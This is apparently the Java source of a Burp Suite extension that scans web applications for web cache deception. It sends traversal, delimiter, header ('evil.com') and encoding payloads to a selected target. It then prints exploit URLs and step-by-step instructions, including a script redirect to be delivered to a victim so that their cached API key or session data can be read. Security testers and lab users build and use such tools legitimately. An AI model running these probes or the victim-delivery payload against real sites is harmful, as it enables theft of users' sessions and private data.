package burp;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintStream;
import java.net.URL;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicLong;

/**
 * @author J Snyman
 * @author T Secker
 * @author atomiczsec
 */
public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtensionStateListener {

    private final static float VERSION = 2.0f;

    private static IBurpExtenderCallbacks callbacks;
    private static IExtensionHelpers helpers;
    private static ThreadPoolExecutor executor;
    private static final AtomicLong scanStartTime = new AtomicLong(0);

    protected static IExtensionHelpers getHelpers() {
        return helpers;
    }

    protected static IBurpExtenderCallbacks getCallbacks() {
        return callbacks;
    }

    protected static void print(String str) {
        callbacks.printOutput(str);
    }
    
    protected static void updateStatus(String status) {
        callbacks.printOutput("\r[WCD] " + status);
    }
    
    protected static void printStatus(String status) {
        callbacks.printOutput("[WCD] " + status);
    }
    
    protected static void logDebug(String message) {
        callbacks.printOutput("[WCD] [DEBUG] " + message);
    }
    
    protected static void logInfo(String message) {
        callbacks.printOutput("[WCD] [INFO] " + message);
    }
    
    protected static void logWarning(String message) {
        if (callbacks != null) {
            callbacks.printError("[WCD] [WARNING] " + message);
        }
    }

    protected static void logError(String message) {
        if (callbacks != null) {
            callbacks.printError("[WCD] [ERROR] " + message);
        }
    }
    
    protected static void logTiming(String phase, long durationMs) {
        callbacks.printOutput(String.format("[WCD] [TIMING] %s: %d ms", phase, durationMs));
    }

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks iBurpExtenderCallbacks) {
        callbacks = iBurpExtenderCallbacks;
        callbacks.setExtensionName("Web Cache Deception Scanner");
        callbacks.registerContextMenuFactory(this);
        callbacks.registerExtensionStateListener(this);
        printStatus("Version " + VERSION + " loaded");

        helpers = iBurpExtenderCallbacks.getHelpers();

        // Initialize performance configuration
        int threadMultiplier = PerformanceConfig.getThreadMultiplier();
        int parallelism = Math.max(2, Runtime.getRuntime().availableProcessors() * threadMultiplier);
        executor = new ThreadPoolExecutor(
                parallelism,
                parallelism,
                60L,
                TimeUnit.SECONDS,
                new LinkedBlockingQueue<>(),
                new ThreadPoolExecutor.CallerRunsPolicy());
        executor.allowCoreThreadTimeOut(false);
        
        // Log system info and configuration
        logInfo("Version " + VERSION + " loaded");
        logInfo(PerformanceConfig.getSystemInfo());
        logInfo(PerformanceConfig.getConfigSummary());
        logInfo("Thread pool size: " + parallelism + " threads");
    }


    private void runScannerForRequest(IHttpRequestResponse iHttpRequestResponse) {
        ThreadPoolExecutor currentExecutor = executor;
        if (currentExecutor != null && !currentExecutor.isShutdown()) {
            try {
                currentExecutor.execute(new ScannerThread(iHttpRequestResponse));
            } catch (RejectedExecutionException e) {
                logWarning("Executor queue full, falling back to new thread: " + e.getMessage());
                new Thread(new ScannerThread(iHttpRequestResponse)).start();
            }
        } else {
            new Thread(new ScannerThread(iHttpRequestResponse)).start();
        }
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation iContextMenuInvocation) {
        List<JMenuItem> items = new ArrayList<>();

        IHttpRequestResponse[] selectedMessages = iContextMenuInvocation.getSelectedMessages();
        if (selectedMessages != null && selectedMessages.length > 0) {
            JMenuItem item = new JMenuItem("Web Cache Deception Test");
            MenuItemListener mil = new MenuItemListener(selectedMessages);
            item.addActionListener(mil);
            items.add(item);
        }
        return items;
    }

    class MenuItemListener implements ActionListener {
        private final IHttpRequestResponse[] arr;

        MenuItemListener(IHttpRequestResponse[] arr) {
            this.arr = arr;
        }

        @Override
        public void actionPerformed(ActionEvent e) {
            for (IHttpRequestResponse message : arr) {
                runScannerForRequest(message);
            }
        }
    }

    class ScannerThread implements Runnable {
        private IHttpRequestResponse reqRes;

        ScannerThread(IHttpRequestResponse reqRes) {
            this.reqRes = reqRes;
        }

        @Override
        public void run() {
            long scanStart = System.currentTimeMillis();
            scanStartTime.set(scanStart);
            try {
                String targetUrlStr = helpers.analyzeRequest(reqRes).getUrl().toString();
                logInfo("Starting scan: " + targetUrlStr);
                
                updateStatus("Initializing...");
                long initStart = System.currentTimeMillis();
                RequestSender.InitialTestResult initialTestResult = RequestSender.initialTest(reqRes);
                if (initialTestResult == null || !initialTestResult.isSuccess()) {
                    String reason = initialTestResult != null
                            ? initialTestResult.getFailureReason()
                            : "Initial path mapping tests failed";
                    logWarning("Scan aborted: " + reason);
                    updateStatus("Scan aborted: " + reason);
                    return;
                }
                String initialRandomSegment = initialTestResult.getRandomSegment();
                logTiming("Initialization", System.currentTimeMillis() - initStart);
                
                // Detect CDN/cache layer
                byte[] testRequest = RequestSender.buildHttpRequest(reqRes, null, null, true);
                Map<String, Object> testDetails = RequestSender.retrieveResponseDetails(reqRes.getHttpService(), testRequest);
                String detectedCDN = null;
                if (testDetails != null) {
                    @SuppressWarnings("unchecked")
                    List<String> headers = (List<String>) testDetails.get("headers");
                    if (headers != null) {
                        detectedCDN = RequestSender.detectCDN(headers);
                        if (detectedCDN != null) {
                            logInfo("Detected CDN/Cache: " + detectedCDN);
                        }
                    }
                }

                String randomSegment = initialRandomSegment;
                if (randomSegment == null || randomSegment.isEmpty()) {
                    // Should not happen, but fall back to a fresh random value if the initial test
                    // completed without producing a usable segment
                    randomSegment = RequestSender.generateRandomString(5);
                }
                
                Map<String, Set<String>> vulnerableDelimiterCombinations = new HashMap<>();
                Map<String, Map<String, String>> successfulNormalizationDetails = new HashMap<>();
                Map<String, String> successfulPrefixExploits = new HashMap<>();
                Map<String, String> successfulRelativeExploits = new HashMap<>();
                Map<String, String> successfulReverseTraversals = new HashMap<>();
                Map<String, Map<String, String>> successfulSelfRefExploits = new HashMap<>();
                Map<String, String> successfulHeaderAttacks = new HashMap<>();
                Map<String, String> successfulHPPAttacks = new HashMap<>();
                Map<String, String> successfulCaseAttacks = new HashMap<>();
                Map<String, String> successfulUnicodeAttacks = new HashMap<>();
                boolean hashTraversalVulnerable = false;
                String successfulTraversalPath = null;

                updateStatus("Testing self-referential normalization...");
                List<String> targetRelativeSegments = Arrays.asList(
                    "resources/", "static/", "css/", "js/", "images/", "public/", "assets/",
                    "api/", "media/", "uploads/", "content/", "files/", "data/"
                );
                // Use advanced delimiters
                List<String> delimiters = Arrays.asList(RequestSender.ADVANCED_DELIMITERS);
                
                for (String delimiter : delimiters) {
                    Map<String, String> successfulSegmentsForDelimiter = new HashMap<>();
                    for (String segment : targetRelativeSegments) {
                        if (RequestSender.testSelfReferentialNormalization(reqRes, delimiter, segment)) {
                            successfulSegmentsForDelimiter.put(segment, "..%2f");
                            break;
                        }
                    }
                    if (!successfulSegmentsForDelimiter.isEmpty()) {
                        successfulSelfRefExploits.put(delimiter, successfulSegmentsForDelimiter);
                    }
                }

                updateStatus("Testing reverse traversal...");
                // Test reverse traversal early - it's a high-severity test
                String[] priorityReversePaths = {"/resources/", "/static/", "/assets/"};
                for (String cachePath : priorityReversePaths) {
                    if (RequestSender.testReverseTraversal(reqRes, cachePath)) {
                        successfulReverseTraversals.put(cachePath, "");
                        break; // Found one, stop
                    }
                }
                
                updateStatus("Testing hash-based traversal...");
                String[] traversalPatterns = {
                    "%2f%2e%2e%2f", "%2f..%2f", "%252f%252e%252e%252f", "/%2e%2e/", "%2f%2e%2e"
                };
                String[] resourcesForTraversal = {
                    "resources", "static", "css", "js", "images", "api", "public", "assets"
                };
                
                for (String traversalPattern : traversalPatterns) {
                    if (hashTraversalVulnerable) break;
                    for (String resource : resourcesForTraversal) {
                        if (RequestSender.testHashPathTraversal(reqRes, resource, traversalPattern)) {
                            hashTraversalVulnerable = true;
                            successfulTraversalPath = traversalPattern + resource;
                            break;
                        }
                    }
                }
                
                // Early exit: If we found high-severity vulnerabilities, skip low-priority tests
                boolean hasHighSeverityVuln = hashTraversalVulnerable || 
                                            !successfulSelfRefExploits.isEmpty() || 
                                            !successfulReverseTraversals.isEmpty();
                
                if (hasHighSeverityVuln) {
                    logInfo("High-severity vulnerabilities found, skipping low-priority tests");
                    // Continue to results analysis
                } else {

                    updateStatus("Testing delimiter + extensions...");
                    // Prioritize common extensions first, test fewer combinations
                    List<String> priorityExtensions = Arrays.asList("js", "css", "html", "jpg", "png", "pdf");
                    List<String> allExtensions = new ArrayList<>(priorityExtensions);
                    
                    // Test priority extensions with common delimiters first
                    String[] commonDelimiters = {"/", ";", "?"};
                    int foundCount = 0;
                    final int MAX_FINDINGS_PER_DELIMITER = 2; // Stop after finding 2 per delimiter
                    
                    for (String delimiter : commonDelimiters) {
                        if (foundCount >= 6) break; // Stop if we've found enough total
                        for (String extension : priorityExtensions) {
                            if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
                                vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
                                foundCount++;
                                if (vulnerableDelimiterCombinations.get(delimiter).size() >= MAX_FINDINGS_PER_DELIMITER) {
                                    break; // Found enough for this delimiter
                                }
                            }
                        }
                    }
                    
                    // Only test other extensions/delimiters if we haven't found anything yet
                    if (vulnerableDelimiterCombinations.isEmpty()) {
                        allExtensions.addAll(Arrays.asList(RequestSender.OTHER_TEST_EXTENSIONS));
                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
                            if (vulnerableDelimiterCombinations.containsKey(delimiter)) continue; // Skip if already found
                            for (String extension : allExtensions) {
                                if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
                                    vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
                                    break; // Stop after first find per delimiter
                                }
                            }
                        }
                    }
                    
                    updateStatus("Testing header-based cache key attacks...");
                    for (String header : RequestSender.CACHE_KEY_HEADERS) {
                        if (RequestSender.testHeaderBasedCacheKey(reqRes, header, "evil.com")) {
                            successfulHeaderAttacks.put(header, "evil.com");
                        }
                    }
                    
                    updateStatus("Testing HTTP Parameter Pollution...");
                    IRequestInfo reqInfo = helpers.analyzeRequest(reqRes);
                    List<IParameter> params = reqInfo.getParameters();
                    for (IParameter param : params) {
                        if (param.getType() == IParameter.PARAM_URL) {
                            if (RequestSender.testHPPCacheKey(reqRes, param.getName())) {
                                successfulHPPAttacks.put(param.getName(), "HPP");
                            }
                        }
                    }
                    
                    updateStatus("Testing case sensitivity attacks...");
                    for (String delimiter : Arrays.asList("/", ";", "?")) {
                        for (String ext : Arrays.asList("css", "js", "html")) {
                            if (RequestSender.testCaseSensitivityAttack(reqRes, delimiter, ext)) {
                                successfulCaseAttacks.put(delimiter, ext);
                                break;
                            }
                        }
                    }
                    
                    updateStatus("Testing unicode normalization...");
                    for (String delimiter : Arrays.asList("/", ";", "?")) {
                        if (RequestSender.testUnicodeNormalization(reqRes, delimiter)) {
                            successfulUnicodeAttacks.put(delimiter, "unicode");
                        }
                    }
                }

                // Only run medium/low priority tests if no high-severity vulnerabilities found yet
                // (hasHighSeverityVuln already checked above, but check again after medium tests)
                boolean stillNoHighSeverityVuln = hashTraversalVulnerable || 
                                            !successfulSelfRefExploits.isEmpty() || 
                                            !successfulReverseTraversals.isEmpty() ||
                                            !successfulHeaderAttacks.isEmpty();
                
                if (!stillNoHighSeverityVuln) {
                    updateStatus("Testing path normalization...");
                    // Prioritize common cacheable paths and templates
                    List<String> priorityPaths = Arrays.asList("/robots.txt", "/favicon.ico", "/", "/index.html");
                    List<String> priorityTemplates = Arrays.asList("%2f%2e%2e%2f", "..%2f");
                    String[] commonDelimitersForNorm = {"/", ";", "?"};
                    
                    // Test priority combinations first
                    for (String delimiter : commonDelimitersForNorm) {
                        Map<String, String> successfulPathsForDelimiter = new HashMap<>();
                        for (String knownPath : priorityPaths) {
                            for (String template : priorityTemplates) {
                                if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
                                    successfulPathsForDelimiter.put(knownPath, template);
                                    break; // Found one, move to next path
                                }
                            }
                        }
                        if (!successfulPathsForDelimiter.isEmpty()) {
                            successfulNormalizationDetails.put(delimiter, successfulPathsForDelimiter);
                            break; // Found vulnerability, stop testing other delimiters
                        }
                    }
                    
                    // Only test remaining combinations if nothing found
                    if (successfulNormalizationDetails.isEmpty()) {
                        List<String> knownPaths = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PATHS);
                        List<String> normalizationTemplates = Arrays.asList(RequestSender.NORMALIZATION_TEMPLATES);
                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
                            Map<String, String> successfulPathsForDelimiter = new HashMap<>();
                            for (String knownPath : knownPaths) {
                                for (String template : normalizationTemplates) {
                                    if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
                                        successfulPathsForDelimiter.put(knownPath, template);
                                        break; // Found one, move to next path
                                    }
                                }
                            }
                            if (!successfulPathsForDelimiter.isEmpty()) {
                                successfulNormalizationDetails.put(delimiter, successfulPathsForDelimiter);
                                break; // Found one, stop
                            }
                        }
                    }

                    updateStatus("Testing relative normalization...");
                    String specificRelativePath = "%2f%2e%2e%2frobots.txt";
                    // Test common delimiters first
                    String[] commonDelimitersForRel = {"/", ";", "?"};
                    for (String delimiter : commonDelimitersForRel) {
                        if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
                            successfulRelativeExploits.put(delimiter, specificRelativePath);
                            break; // Found one, stop
                        }
                    }
                    
                    // Only test remaining if nothing found
                    if (successfulRelativeExploits.isEmpty()) {
                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
                            if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
                                successfulRelativeExploits.put(delimiter, specificRelativePath);
                                break; // Found one, stop
                            }
                        }
                    }

                    updateStatus("Testing prefix normalization...");
                    // Prioritize common prefixes
                    List<String> priorityPrefixes = Arrays.asList("/resources/", "/static/", "/assets/", "/public/");
                    String[] commonDelimitersForPrefix = {"/", ";", "?"};
                    
                    // Test priority combinations first
                    for (String delimiter : commonDelimitersForPrefix) {
                        for (String prefix : priorityPrefixes) {
                            if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
                                successfulPrefixExploits.put(delimiter, prefix);
                                break; // Found one, stop testing this delimiter
                            }
                        }
                        if (successfulPrefixExploits.containsKey(delimiter)) {
                            break; // Found vulnerability, stop testing other delimiters
                        }
                    }
                    
                    // Only test remaining if nothing found
                    if (successfulPrefixExploits.isEmpty()) {
                        List<String> knownPrefixes = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PREFIXES);
                        for (String delimiter : Arrays.asList(RequestSender.ADVANCED_DELIMITERS)) {
                            for (String prefix : knownPrefixes) {
                                if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
                                    successfulPrefixExploits.put(delimiter, prefix);
                                    break;
                                }
                            }
                            if (successfulPrefixExploits.containsKey(delimiter)) {
                                break; // Found one, stop
                            }
                        }
                    }
                } else {
                    logInfo("Skipping medium/low priority tests - high-severity vulnerabilities already found");
                }

                updateStatus("Analyzing results...");
                boolean anyHits = !successfulSelfRefExploits.isEmpty() || 
                                hashTraversalVulnerable || 
                                !vulnerableDelimiterCombinations.isEmpty() || 
                                !successfulNormalizationDetails.isEmpty() ||
                                !successfulPrefixExploits.isEmpty() ||
                                !successfulRelativeExploits.isEmpty() ||
                                !successfulReverseTraversals.isEmpty() ||
                                !successfulHeaderAttacks.isEmpty() ||
                                !successfulHPPAttacks.isEmpty() ||
                                !successfulCaseAttacks.isEmpty() ||
                                !successfulUnicodeAttacks.isEmpty();
                
                long scanDuration = System.currentTimeMillis() - scanStart;
                logTiming("Total scan duration", scanDuration);

                if (anyHits) {
                    WebCacheIssue issue = new WebCacheIssue(reqRes);
                    Set<String> allVulnerableExtensions = new HashSet<>();
                    for (Set<String> extensions : vulnerableDelimiterCombinations.values()) {
                        allVulnerableExtensions.addAll(extensions);
                    }
                    if (!allVulnerableExtensions.isEmpty()) {
                        issue.setVulnerableExtensions(allVulnerableExtensions);
                    }
                    
                    logInfo("VULNERABILITY FOUND: " + targetUrlStr);
                    String exploitSummary = generateExploitDetails(reqRes, successfulSelfRefExploits, hashTraversalVulnerable,
                                         successfulTraversalPath, vulnerableDelimiterCombinations,
                                         successfulNormalizationDetails, successfulPrefixExploits,
                                         successfulRelativeExploits, successfulReverseTraversals,
                                         successfulHeaderAttacks, successfulHPPAttacks,
                                         successfulCaseAttacks, successfulUnicodeAttacks, detectedCDN);

                    callbacks.addScanIssue(issue);
                    String alertMessage = "Web Cache Deception issue identified at " + targetUrlStr;
                    if (exploitSummary != null && !exploitSummary.isEmpty()) {
                        alertMessage += "\n" + exploitSummary;
                    }
                    callbacks.issueAlert(alertMessage);
                } else {
                    logInfo("No vulnerabilities found: " + targetUrlStr);
                }

            } catch (Throwable t) {
                logError("ERROR: " + t.getMessage());
                t.printStackTrace(new PrintStream(callbacks.getStderr()));
            }
        }
        
        private String generateExploitDetails(IHttpRequestResponse reqRes,
                                          Map<String, Map<String, String>> successfulSelfRefExploits,
                                          boolean hashTraversalVulnerable, String successfulTraversalPath,
                                          Map<String, Set<String>> vulnerableDelimiterCombinations,
                                          Map<String, Map<String, String>> successfulNormalizationDetails,
                                          Map<String, String> successfulPrefixExploits,
                                          Map<String, String> successfulRelativeExploits,
                                          Map<String, String> successfulReverseTraversals,
                                          Map<String, String> successfulHeaderAttacks,
                                          Map<String, String> successfulHPPAttacks,
                                          Map<String, String> successfulCaseAttacks,
                                          Map<String, String> successfulUnicodeAttacks,
                                          String detectedCDN) {
            
            String baseUrl = helpers.analyzeRequest(reqRes).getUrl().toString();
            if (baseUrl.contains("?")) {
                baseUrl = baseUrl.substring(0, baseUrl.indexOf("?"));
            }
            
            int exploitCount = 0;
            StringBuilder summary = new StringBuilder();
            
            if (detectedCDN != null) {
                summary.append(String.format("[INFO] Detected CDN/Cache: %s\n", detectedCDN));
            }
            
            String targetPath = helpers.analyzeRequest(reqRes).getUrl().getPath();
            String targetFilename = extractFilename(targetPath);

            // Self-Referential Normalization Exploits
            if (!successfulSelfRefExploits.isEmpty()) {
                for (Map.Entry<String, Map<String, String>> delimiterEntry : successfulSelfRefExploits.entrySet()) {
                    for (Map.Entry<String, String> segmentEntry : delimiterEntry.getValue().entrySet()) {
                        String exploitPath = segmentEntry.getKey() + segmentEntry.getValue() + targetFilename;
                        String exploitUrl = baseUrl + delimiterEntry.getKey() + exploitPath + "?wcd=" +
                                RequestSender.generateRandomString(4);
                        summary.append(String.format("%d. [HIGH] Self-Referential: %s\n", ++exploitCount, exploitUrl));
                    }
                }
            }
            
            // Hash Path Traversal Exploits
            if (hashTraversalVulnerable && successfulTraversalPath != null) {
                String exploitUrl = baseUrl + "%23" + successfulTraversalPath + "?wcd=" +
                        RequestSender.generateRandomString(4);
                summary.append(String.format("%d. [HIGH] Hash Traversal: %s\n", ++exploitCount, exploitUrl));
            }

            // Reverse Traversal Exploits
            if (!successfulReverseTraversals.isEmpty()) {
                for (String cachePath : successfulReverseTraversals.keySet()) {
                    String exploitUrl = baseUrl.replace(targetPath, cachePath + "..%2f" + targetFilename) + "?wcd=" +
                            RequestSender.generateRandomString(4);
                    summary.append(String.format("%d. [HIGH] Reverse Traversal: %s\n", ++exploitCount, exploitUrl));
                }
            }

            // Delimiter + Extension Exploits
            if (!vulnerableDelimiterCombinations.isEmpty()) {
                for (Map.Entry<String, Set<String>> entry : vulnerableDelimiterCombinations.entrySet()) {
                    for (String ext : entry.getValue()) {
                        String exploitUrl = baseUrl + entry.getKey() + "test." + ext + "?wcd=" +
                                RequestSender.generateRandomString(4);
                        summary.append(String.format("%d. [MEDIUM] Delimiter+Ext: %s\n", ++exploitCount, exploitUrl));
                    }
                }
            }

            // Relative Path Normalization Exploits
            if (!successfulRelativeExploits.isEmpty()) {
                for (Map.Entry<String, String> entry : successfulRelativeExploits.entrySet()) {
                    String exploitUrl = baseUrl + entry.getKey() + entry.getValue() + "?wcd=" +
                            RequestSender.generateRandomString(4);
                    summary.append(String.format("%d. [MEDIUM] Relative Norm: %s\n", ++exploitCount, exploitUrl));
                }
            }

            // Prefix Normalization Exploits
            if (!successfulPrefixExploits.isEmpty()) {
                for (Map.Entry<String, String> entry : successfulPrefixExploits.entrySet()) {
                    String prefix = entry.getValue().startsWith("/") ? entry.getValue().substring(1) : entry.getValue();
                    String exploitUrl = baseUrl + entry.getKey() + "%2f%2e%2e%2f" + prefix + "?wcd=" +
                            RequestSender.generateRandomString(4);
                    summary.append(String.format("%d. [MEDIUM] Prefix Norm: %s\n", ++exploitCount, exploitUrl));
                }
            }

            // Header-based attacks
            if (!successfulHeaderAttacks.isEmpty()) {
                for (Map.Entry<String, String> entry : successfulHeaderAttacks.entrySet()) {
                    summary.append(String.format("%d. [HIGH] Header Attack: %s: %s\n", ++exploitCount,
                            entry.getKey(), entry.getValue()));
                }
            }

            // HPP attacks
            if (!successfulHPPAttacks.isEmpty()) {
                for (Map.Entry<String, String> entry : successfulHPPAttacks.entrySet()) {
                    summary.append(String.format("%d. [MEDIUM] HPP Attack: Parameter %s\n", ++exploitCount, entry.getKey()));
                }
            }

            // Case sensitivity attacks
            if (!successfulCaseAttacks.isEmpty()) {
                for (Map.Entry<String, String> entry : successfulCaseAttacks.entrySet()) {
                    summary.append(String.format("%d. [MEDIUM] Case Sensitivity: %s with %s\n", ++exploitCount,
                            entry.getKey(), entry.getValue()));
                }
            }

            // Unicode attacks
            if (!successfulUnicodeAttacks.isEmpty()) {
                for (Map.Entry<String, String> entry : successfulUnicodeAttacks.entrySet()) {
                    summary.append(String.format("%d. [MEDIUM] Unicode Normalization: %s\n", ++exploitCount,
                            entry.getKey()));
                }
            }
            
            if (exploitCount > 0) {
                logInfo(String.format("Found %d exploit(s):", exploitCount));
                print(summary.toString());
                
                // Add exploit crafting instructions
                String craftingInstructions = generateExploitCraftingInstructions(reqRes, baseUrl, targetPath, targetFilename,
                        successfulReverseTraversals, successfulSelfRefExploits, hashTraversalVulnerable, successfulTraversalPath);
                if (craftingInstructions != null && !craftingInstructions.isEmpty()) {
                    print("\n=== EXPLOIT CRAFTING INSTRUCTIONS ===\n");
                    print(craftingInstructions);
                    summary.append("\n\n=== EXPLOIT CRAFTING INSTRUCTIONS ===\n");
                    summary.append(craftingInstructions);
                }
            }

            return summary.toString();
        }
        
        private String generateExploitCraftingInstructions(IHttpRequestResponse reqRes, String baseUrl, String targetPath,
                String targetFilename, Map<String, String> successfulReverseTraversals,
                Map<String, Map<String, String>> successfulSelfRefExploits, boolean hashTraversalVulnerable,
                String successfulTraversalPath) {
            
            StringBuilder instructions = new StringBuilder();
            String bestExploitUrl = null;
            String bestExploitType = null;
            
            // Prioritize reverse traversal as it's the most common and reliable
            if (!successfulReverseTraversals.isEmpty()) {
                String cachePath = successfulReverseTraversals.keySet().iterator().next();
                bestExploitUrl = baseUrl.replace(targetPath, cachePath + "..%2f" + targetFilename);
                bestExploitType = "Reverse Traversal";
            } else if (!successfulSelfRefExploits.isEmpty()) {
                // Use self-referential normalization
                Map.Entry<String, Map<String, String>> firstEntry = successfulSelfRefExploits.entrySet().iterator().next();
                String delimiter = firstEntry.getKey();
                Map.Entry<String, String> segmentEntry = firstEntry.getValue().entrySet().iterator().next();
                String exploitPath = segmentEntry.getKey() + segmentEntry.getValue() + targetFilename;
                bestExploitUrl = baseUrl + delimiter + exploitPath;
                bestExploitType = "Self-Referential Normalization";
            } else if (hashTraversalVulnerable && successfulTraversalPath != null) {
                bestExploitUrl = baseUrl + "%23" + successfulTraversalPath;
                bestExploitType = "Hash Traversal";
            }
            
            if (bestExploitUrl == null) {
                return null; // No suitable exploit found
            }
            
            // Extract domain for exploit server
            try {
                URL url = new URL(baseUrl);
                String domain = url.getHost();
                if (url.getPort() != -1 && url.getPort() != url.getDefaultPort()) {
                    domain = url.getHost() + ":" + url.getPort();
                }
                
                instructions.append("CRAFT AN EXPLOIT:\n\n");
                instructions.append("1. Burp Repeater Test:\n");
                instructions.append("   - Go to the Repeater tab\n");
                instructions.append("   - Send a GET request to: ").append(bestExploitUrl).append("\n");
                instructions.append("   - Verify you receive a 200 response with sensitive data\n");
                instructions.append("   - Check the X-Cache header (should show 'miss' on first request, 'hit' on second)\n\n");
                
                instructions.append("2. Exploit Server Payload:\n");
                instructions.append("   - In Burp's browser, click 'Go to exploit server'\n");
                instructions.append("   - In the Body section, paste this exploit:\n\n");
                
                String exploitPayload = String.format("<script>document.location=\"%s?wcd=\"+Math.random()</script>", 
                        bestExploitUrl);
                instructions.append("   ").append(exploitPayload).append("\n\n");
                
                instructions.append("   - Click 'Deliver exploit to victim'\n");
                instructions.append("   - When the victim views the exploit, their response is cached\n\n");
                
                instructions.append("3. Retrieve Cached Response:\n");
                instructions.append("   - Visit the exploit URL in your browser:\n");
                instructions.append("   ").append(bestExploitUrl).append("?wcd=<random>\n");
                instructions.append("   - The response should contain the victim's sensitive data (API key, session, etc.)\n");
                instructions.append("   - Copy the sensitive data from the cached response\n\n");
                
                instructions.append("NOTE: The '?wcd=' parameter with a random value acts as a cache buster to ensure\n");
                instructions.append("      you don't receive your own previously cached response.\n");
                
            } catch (Exception e) {
                // If URL parsing fails, provide simpler instructions
                instructions.append("CRAFT AN EXPLOIT:\n\n");
                instructions.append("1. Test the exploit URL in Burp Repeater:\n");
                instructions.append("   ").append(bestExploitUrl).append("?wcd=<random>\n\n");
                instructions.append("2. Create an exploit server payload:\n");
                instructions.append("   <script>document.location=\"").append(bestExploitUrl).append("?wcd=\"+Math.random()</script>\n\n");
                instructions.append("3. Deliver to victim and retrieve cached response from the exploit URL.\n");
            }
            
            return instructions.toString();
        }
        
        private String extractFilename(String path) {
            if (path == null || path.isEmpty() || !path.startsWith("/")) {
                return "index";
            }
            
            int lastSlash = path.lastIndexOf('/');
            if (lastSlash == path.length() - 1 && path.length() > 1) {
                // Path ends with slash, get directory name
                int secondLastSlash = path.lastIndexOf('/', lastSlash - 1);
                return path.substring(secondLastSlash + 1, lastSlash);
            } else if (lastSlash == -1 || lastSlash == 0) {
                return "index";
            } else {
                return path.substring(lastSlash + 1);
            }
        }
    }

    @Override
    public void extensionUnloaded() {
        ThreadPoolExecutor currentExecutor = executor;
        if (currentExecutor != null && !currentExecutor.isShutdown()) {
            currentExecutor.shutdown();
            try {
                // Wait for tasks to complete
                if (!currentExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                    currentExecutor.shutdownNow();
                    logWarning("Some scanning tasks may not have completed cleanly");
                }
            } catch (InterruptedException e) {
                currentExecutor.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }
}
